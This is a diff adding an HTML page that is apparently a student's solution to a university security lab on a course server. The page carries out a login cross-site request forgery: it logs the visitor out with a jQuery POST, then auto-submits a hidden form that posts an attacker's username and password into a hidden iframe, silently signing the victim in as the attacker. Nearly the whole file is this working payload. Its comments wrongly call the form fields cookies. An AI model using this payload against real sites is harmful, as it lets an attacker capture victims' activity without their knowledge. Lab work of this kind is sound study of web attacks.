@@ -1,0 +1,16 @@
+<!--  Variation 1; No defenses -->
+
+<head>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+
+<iframe style="display:none" name="Mal_frame"></iframe> // exploit iframes with form to send a post request with appropriate cookies
+<form method='POST' action='https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4' target="Mal_frame" id="Mal_CSRF">
+  <input type='hidden' name='username' value='attacker'>  // Username cookie
+  <input type='hidden' name='password' value='l33th4x'>   // Password cookie
+</form>
+
+<script>
+$.post('https://project2.ecen4133.org/logout'); // Logout of any account to delete current session
+document.getElementById("Mal_CSRF").submit()  // Submit form
+</script>
